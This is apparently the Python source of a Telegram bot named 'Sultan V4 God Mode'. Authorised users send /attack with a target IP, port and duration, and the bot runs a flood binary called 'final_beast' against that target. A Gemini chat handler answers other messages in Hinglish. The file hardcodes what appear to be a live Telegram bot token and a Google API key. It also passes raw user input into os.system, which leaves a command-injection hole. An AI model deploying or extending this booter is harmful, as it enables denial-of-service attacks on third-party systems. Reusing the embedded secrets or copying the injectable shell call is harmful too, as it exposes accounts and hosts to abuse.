import telebot, os, threading, google.generativeai as genai
from flask import Flask

# --- CONFIGURATION ---
TOKEN = "8586393188:AAFRRfO-oerTgHar07vuvWHTMHgfUBY52ew"
genai.configure(api_key="AIzaSyCcpvCR_G6qp1F6g_Dj1QEYKIr8PdPVMF0")
model = genai.GenerativeModel('gemini-1.5-flash')

bot = telebot.TeleBot(TOKEN)
app = Flask('')

ADMIN_ID = 5961723105
logged_in = [ADMIN_ID]

@app.route('/')
def home(): return "Sultan V4 God Mode is LIVE!"

# --- POWER ATTACK ENGINE ---
def fire_attack(ip, port, dur):
    # Binary ko execute karne ka sabse powerful tarika
    os.system(f"chmod +x final_beast && ./final_beast {ip} {port} {dur} 1000")

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    if message.from_user.id not in logged_in:
        bot.reply_to(message, "🚫 Access Denied!")
        return
    args = message.text.split()
    if len(args) < 4:
        bot.reply_to(message, "❌ Format: /attack <IP> <PORT> <TIME>")
        return
    
    ip, port, dur = args[1], args[2], args[3]
    bot.reply_to(message, f"🚀 **SULTAN DEEP-FIRE STARTED!**\nTarget: `{ip}:{port}`\n⏳ Time: `{dur}s`")
    
    # Ye background mein chalega taaki bot hang na ho
    threading.Thread(target=fire_attack, args=(ip, port, dur)).start()

@bot.message_handler(func=lambda m: not m.text.startswith('/'))
def ai_chat(message):
    try:
        res = model.generate_content(f"Short reply in Hinglish as Sultan AI. User: {message.text}")
        bot.reply_to(message, res.text)
    except: pass

if __name__ == "__main__":
    # Flask port management
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=10000)).start()
    bot.polling(none_stop=True)
